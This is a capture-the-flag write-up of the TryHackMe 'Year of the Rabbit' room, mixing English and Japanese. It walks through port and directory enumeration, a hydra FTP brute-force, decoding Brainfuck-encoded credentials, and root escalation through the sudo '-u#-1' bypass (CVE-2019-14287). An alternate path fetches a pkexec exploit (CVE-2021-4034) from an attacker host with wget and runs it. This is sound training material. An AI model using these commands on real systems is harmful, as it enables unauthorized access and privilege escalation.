## Year of the Rabbit
https://tryhackme.com/room/yearoftherabbit

## Enum
```
nmap -sC -sV -sS 10.10.33.39 -vv

Scanning ip.thm (10.10.33.39) [1000 ports]
Discovered open port 22/tcp on 10.10.33.39
Discovered open port 80/tcp on 10.10.33.39
Discovered open port 21/tcp on 10.10.33.39

Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 61 vsftpd 3.0.2
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAILCKdtvyy1FqH1gBS+POXpHMlDynp+m6Ewj2yoK2PJKJeQeO2yRty1/qcf0eAHJGRngc9+bRPYe4M518+7yBVdO2p8UbIItiGzQHEXJu0tGdhIxmpbTdCT6V8HqIDjzrq2OB/PmsjoApVHv9N5q1Mb2i9J9wcnzlorK03gJ9vpxAAAAFQDVV1vsKCWHW/gHLSdO40jzZKVoyQAAAIA9EgFqJeRxwuCjzhyeASUEe+Wz9PwQ4lJI6g1z/1XNnCKQ9O6SkL54oTkB30RbFXBT54s3a11e5ahKxtDp6u9yHfItFOYhBt424m14ks/MXkDYOR7y07FbBYP5WJWk0UiKdskRej9P79bUGrXIcHQj3c3HnwDfKDnflN56Fk9rIwAAAIBlt2RBJWg3ZUqbRSsdaW61ArR4YU7FVLDgU0pHAIF6eq2R6CCRDjtbHE4X5eW+jhi6XMLbRjik9XOK78r2qyQwvHADW1hSWF6FgfF2PF5JKnvPG3qF2aZ2iOj9BVmsS5MnwdSNBytRydx9QJiyaI4+HyOkwomj0SINqR9CxYLfRA==
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZyTWF65dczfLiKN0cNpHhm/nZ7FWafVaCf+Oxu7+9VM4GBO/8eWI5CedcIDkhU3Li/XBDUSELLXSRJOtQj5WdBOrFVBWWA3b3ICQqk0N1cmldVJRLoP1shBm/U5Xgs5QFx/0nvtXSGFwBGpfVKsiI/YBGrDkgJNAYdgWOzcQqol/nnam8EpPx0nZ6+c2ckqRCizDuqHXkNN/HVjpH0GhiscE6S6ULvq2bbf7ULjvWbrSAMEo6ENsy3RMEcQX+Ixxr0TQjKdjW+QdLay0sR7oIiATh5AL5vBGHTk2uR8ypsz1y7cTyXG2BjIVpNWeTzcip7a2/HYNNSJ1Y5QmAXoKd
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKavguvzBa889jvV30DH4fhXzMcLv6VdHFx3FVcAE0MqHRcLIyZcLcg6Rf0TNOhMQuu7Cut4Bf6SQseNVNJKK8=
|   256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBJPbfvzsYSbGxT7dwo158eVWRlfvXCxeOB4ypi9Hgh
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.10 ((Debian))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.10 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

nmap -Pn -sS 10.10.33.39 -p- --min-rate=1000

Host is up (0.42s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

```
ffuf -u http://ip.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
________________________________________________

.htpasswd               [Status: 403, Size: 271, Words: 20, Lines: 10, Duration: 445ms]
.hta                    [Status: 403, Size: 271, Words: 20, Lines: 10, Duration: 468ms]
.htaccess               [Status: 403, Size: 271, Words: 20, Lines: 10, Duration: 464ms]
assets                  [Status: 301, Size: 301, Words: 20, Lines: 10, Duration: 440ms]
index.html              [Status: 200, Size: 7853, Words: 2862, Lines: 190, Duration: 414ms]
server-status           [Status: 403, Size: 271, Words: 20, Lines: 10, Duration: 415ms]
:: Progress: [4713/4713] :: Job [1/1] :: 93 req/sec :: Duration: [0:01:00] :: Errors: 0 ::
```

![image](https://user-images.githubusercontent.com/6504854/192104161-09076989-b8e6-4d4b-82bc-2b476ca6f9c2.png)

![image](https://user-images.githubusercontent.com/6504854/192104282-6566633e-cdef-4bac-a1f7-b3bf40c8432a.png)

👊👊👊

![image](https://user-images.githubusercontent.com/6504854/192104238-e8faef36-9f74-44dc-a1ce-e0caae3c75cd.png)

👀

```
curl ip.thm/su**************.php -L

<html>
        <head>
                <title>su</title>
        </head>
        <body>
                <noscript>Love it when people block Javascript...<br></noscript>
                <noscript>This is happening whether you like it or not... The hint is in the video. If you're stuck here then you're just going to have to bite the bullet!<br>Make sure your audio is turned up!<br></noscript>
                <script>
                        alert("Word of advice... Turn off your javascript...");
                        window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1";
                </script>
                <video controls>
                        <source src="/assets/RickRolled.mp4" type="video/mp4">
                </video>
        </body>
</html>
```

![image](https://user-images.githubusercontent.com/6504854/192104458-94700c2c-7a49-49b8-8d6e-572f3b90f869.png)

😆😆😆

もうYoutubeのリンク全部これなんじゃないのか。。。。（リックアストリーのNeverGonnaGiveUp）

```
curl ip.thm/s****************.php -v

*   Trying 10.10.33.39:80...
* Connected to ip.thm (10.10.33.39) port 80 (#0)
> GET /s****************.php HTTP/1.1
> Host: ip.thm
> User-Agent: curl/7.85.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Date: Sat, 24 Sep 2022 12:24:39 GMT
< Server: Apache/2.4.10 (Debian)
< Location: intermediary.php?hidden_directory=/WExYY2Cv-qU
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
<
* Connection #0 to host ip.thm left intact
```

```
curl ip.thm/intermediary.php?hidden_directory=/WExYY2Cv-qU -v

*   Trying 10.10.33.39:80...
* Connected to ip.thm (10.10.33.39) port 80 (#0)
> GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
> Host: ip.thm
> User-Agent: curl/7.85.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Date: Sat, 24 Sep 2022 12:27:28 GMT
< Server: Apache/2.4.10 (Debian)
< location: /sup3r_s3cret_fl4g
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
<
* Connection #0 to host ip.thm left intact
```

```
curl ip.thm/WExYY2Cv-qU -v

*   Trying 10.10.33.39:80...
* Connected to ip.thm (10.10.33.39) port 80 (#0)
> GET /WExYY2Cv-qU HTTP/1.1
> Host: ip.thm
> User-Agent: curl/7.85.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 301 Moved Permanently
< Date: Sat, 24 Sep 2022 12:28:57 GMT
< Server: Apache/2.4.10 (Debian)
< Location: http://ip.thm/WExYY2Cv-qU/
< Content-Length: 306
< Content-Type: text/html; charset=iso-8859-1
<
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://ip.thm/WExYY2Cv-qU/">here</a>.</p>
<hr>
<address>Apache/2.4.10 (Debian) Server at ip.thm Port 80</address>
</body></html>
* Connection #0 to host ip.thm left intact
```

```
curl ip.thm/WExYY2Cv-qU -v -L

*   Trying 10.10.33.39:80...
* Connected to ip.thm (10.10.33.39) port 80 (#0)
> GET /WExYY2Cv-qU HTTP/1.1
> Host: ip.thm
> User-Agent: curl/7.85.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 301 Moved Permanently
< Date: Sat, 24 Sep 2022 12:29:16 GMT
< Server: Apache/2.4.10 (Debian)
< Location: http://ip.thm/WExYY2Cv-qU/
< Content-Length: 306
< Content-Type: text/html; charset=iso-8859-1
<
* Ignoring the response-body
* Connection #0 to host ip.thm left intact
* Issue another request to this URL: 'http://ip.thm/WExYY2Cv-qU/'
* Found bundle for host: 0x55e8bb7c98f0 [serially]
* Can not multiplex, even if we wanted to
* Re-using existing connection #0 with host ip.thm
* Connected to ip.thm (10.10.33.39) port 80 (#0)
> GET /WExYY2Cv-qU/ HTTP/1.1
> Host: ip.thm
> User-Agent: curl/7.85.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 24 Sep 2022 12:29:16 GMT
< Server: Apache/2.4.10 (Debian)
< Vary: Accept-Encoding
< Content-Length: 949
< Content-Type: text/html;charset=UTF-8
<
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /WExYY2Cv-qU</title>
 </head>
 <body>
<h1>Index of /WExYY2Cv-qU</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="Hot_Babe.png">Hot_Babe.png</a></td><td align="right">2020-01-23 00:34  </td><td align="right">464K</td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.10 (Debian) Server at ip.thm Port 80</address>
</body></html>
* Connection #0 to host ip.thm left intact
```

🏴 Yes,I did! I found something new page (No more Never give up movie...)

I stucked, scanned with big wordlist but nothing found so I checked writeups. 😉

![image](https://user-images.githubusercontent.com/6504854/192104953-1d92af3a-b60a-4c00-83e7-8c29767424d5.png)

![image](https://user-images.githubusercontent.com/6504854/192104977-5790b310-b70d-447e-9855-e76d076a4c6b.png)

🏴 I remember her face, I think some sort of legend woman of WWW. 　どこかでみおぼえがあるお方。。。 🤔

```
curl http://ip.thm/WExYY2Cv-qU/Hot_Babe.png -o Hot.png

% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  463k  100  463k    0     0  94720      0  0:00:05  0:00:05 --:--:--  118k

file Hot.png

Hot.png: PNG image data, 512 x 512, 8-bit/color RGB, non-interlaced

strings Hot.png
```

![image](https://user-images.githubusercontent.com/6504854/192105539-66cd7401-bf95-4537-9247-16e0043ba522.png)

🏴 I cheked with strings command and found username and passwordlist.

```
hydra -l f****** -P ftppass.txt ftp://10.10.33.39 -v

Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
[DATA] attacking ftp://10.10.33.39:21/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[21][ftp] host: 10.10.33.39   login: f******   password: 5***********Q
[STATUS] attack finished for 10.10.33.39 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```
🏴 I got ftp credential.

```
ftp
ftp> open 10.10.33.39
Connected to 10.10.33.39.
220 (vsFTPd 3.0.2)
Name (10.10.33.39:root): f******

ftp> ls
229 Entering Extended Passive Mode (|||43098|).
150 Here comes the directory listing.
-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt

ftp> get Eli's_Creds.txt
local: Eli's_Creds.txt remote: Eli's_Creds.txt
226 Transfer complete.
```

```
cat "Eli's_Creds.txt"

+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
```
😵‍💫😵‍💫😵‍💫 BBB Brainfu*k!

![image](https://user-images.githubusercontent.com/6504854/192105912-119f0f9b-9679-440a-898a-efa979241a2f.png)

https://www.dcode.fr/langage-brainfuck


## Flag
```
ssh eli@ip.thm
The authenticity of host 'ip.thm (10.10.33.39)' can't be established.
eli@ip.thm's password:


1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE
```

Gwendoline ??? s3cr3t ??? 🤔

```
eli@year-of-the-rabbit:/home$ ls -la
total 16
drwxr-xr-x  4 root       root       4096 Jan 23  2020 .
drwxr-xr-x 23 root       root       4096 Jan 23  2020 ..
drwxr-xr-x 16 eli        eli        4096 Jan 23  2020 eli
drwxr-xr-x  2 gwendoline gwendoline 4096 Jan 23  2020 gwendoline

eli@year-of-the-rabbit:/home$ ls -la gwendoline
total 24
drwxr-xr-x 2 gwendoline gwendoline 4096 Jan 23  2020 .
drwxr-xr-x 4 root       root       4096 Jan 23  2020 ..
lrwxrwxrwx 1 root       root          9 Jan 23  2020 .bash_history -> /dev/null
-rw-r--r-- 1 gwendoline gwendoline  220 Jan 23  2020 .bash_logout
-rw-r--r-- 1 gwendoline gwendoline 3515 Jan 23  2020 .bashrc
-rw-r--r-- 1 gwendoline gwendoline  675 Jan 23  2020 .profile
-r--r----- 1 gwendoline gwendoline   46 Jan 23  2020 user.txt

eli@year-of-the-rabbit:/home$ cat gwendoline/user.txt
cat: gwendoline/user.txt: Permission denied

eli@year-of-the-rabbit:/home$ cat /etc/shadow
cat: /etc/shadow: Permission denied

eli@year-of-the-rabbit:/home$ find / -name s3cr3t 2>/dev/null
/usr/games/s3cr3t

eli@year-of-the-rabbit:/home$ cd /usr/games/s3cr3t
eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Jan 23  2020 .
drwxr-xr-x 3 root root 4096 Jan 23  2020 ..
-rw-r--r-- 1 root root  138 Jan 23  2020 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!

eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
Your password is awful, Gwendoline.
It should be at least 60 characters long! Not just Mn***********
Honestly!

Yours sincerely
   -Root
```

```
eli@year-of-the-rabbit:/usr/games/s3cr3t$ su gwendoline
Password:
gwendoline@year-of-the-rabbit:/usr/games/s3cr3t$ cat /home/gwendoline/user.txt
THM{1*****************************************}

gwendoline@year-of-the-rabbit:/usr/games/s3cr3t$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```
👀 (ALL, !root)
https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability

```
gwendoline@year-of-the-rabbit:/usr/games/s3cr3t$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt

uid=0(root) gid=0(root) groups=0(root)

Press ENTER or type command to continue
THM{8***************************************1}
```
🏴 Runned vi and type esc(exit insert mode) and :!cat /root/root.txt

### Another Path
```
ssh eli@10.10.1.186

eli@year-of-the-rabbit:~$ ls -la /usr/bin/pkexec
-rwsr-xr-x 1 root root 23168 Nov 28  2014 /usr/bin/pkexec

eli@year-of-the-rabbit:~$ wget 10.10.10.10/1.tar
--2022-09-24 16:40:17--  http://10.10.10.10/1.tar

HTTP request sent, awaiting response... 200 OK
Length: 92160 (90K) [application/x-tar]
Saving to: ‘1.tar’

1.tar                     100%[====================================>]  90.00K  72.7KB/s   in 1.2s

eli@year-of-the-rabbit:~$ tar -xvf 1.tar
./cve-2021-4034
./cve-2021-4034.c

eli@year-of-the-rabbit:~$ ./cve-2021-4034
# cat /root/root.txt
THM{8********************************1}
```
😋😋😋　いつものもできた。

Thank you for your time, Happy Hacking. 😄

ここで一句、
警報のなりけり夜の虫の声

🙇‍♀️

